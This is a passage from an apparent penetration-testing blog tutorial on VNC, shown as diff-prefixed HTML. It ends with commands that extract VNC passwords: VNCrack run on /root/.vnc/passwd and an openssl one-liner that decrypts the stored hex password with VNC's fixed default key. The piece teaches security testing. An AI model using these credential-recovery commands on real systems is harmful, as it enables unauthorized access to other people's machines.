+set session 1
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8S8p1S7aHUg/YNyrNIh-TDI/AAAAAAAAxGs/neRCYw1ck54U6cBTUN1KMRqL3QkWMQu6gCLcBGAsYHQ/s16000/39.png"/></span></p>
+<p class="" data-start="2706" data-end="2896"><span style="color: #000000;">We previously tested <strong data-start="2727" data-end="2738">VNCrack</strong> and found it effective at deciphering encoded credentials. When using Kali Linux, we provided the encoded password, and VNCrack revealed the actual password.</span></p>
+<p class="" data-start="2898" data-end="3150"><span style="color: #000000;">If you’re on Ubuntu or another Linux system and want to extract stored credentials from the same device, you can use VNCrack again. We tested this on our Ubuntu VNC server. We successfully retrieved the clear text password from the configuration files.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./vncrack_s -C /root/.vnc/passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NqSGzmyxKhM/YNyrVM5PtGI/AAAAAAAAxG0/DVaUS-XZBKIoHkGh7ibaaBlWrvWSTyV3QCLcBGAsYHQ/s16000/40.png"/></span></p>
+<p><span style="color: #000000;">VNC stores passwords as hex strings in.vnc files using a default encryption key. We can manually decode the password using <strong data-start="3324" data-end="3335">OpenSSL</strong>. First, we echo the encoded password and pipe it through thexxd command to convert it into a hex format. Then, we pass the hex into OpenSSL with the encryption key. Finally, we use hexdump to display the clear text password.</span></p>
+<p><strong data-start="3567" data-end="3578"><span style="color: #000000;">Source</span>:</strong> <a class="" href="https://github.com/billchaison/VNCDecrypt" target="_new" rel="noopener" data-start="3579" data-end="3620">https://github.com/billchaison/VNCDecrypt</a></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo -n f0e43164f6c2e373 | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wATVPGu7_t0/YNyrcUVrmMI/AAAAAAAAxG8/pMvwkZ7EiDwUfDcuBg3RTna4DYaEMs00QCLcBGAsYHQ/s16000/41.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Conclusion</strong></span></h3>
+<p><span style="color: #000000;">VNC Service is one of the most used services due to its cross-platform advantage. It was quite important when it was developed but the Pandemic and Work from Home culture has made it the necessity of every enterprise. This article serves as a detailed guide to how to perform a penetration test on a VNC Setup. We hope it can give penetration testers the edge that they need over threat actors targeting their VNC Environment.</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
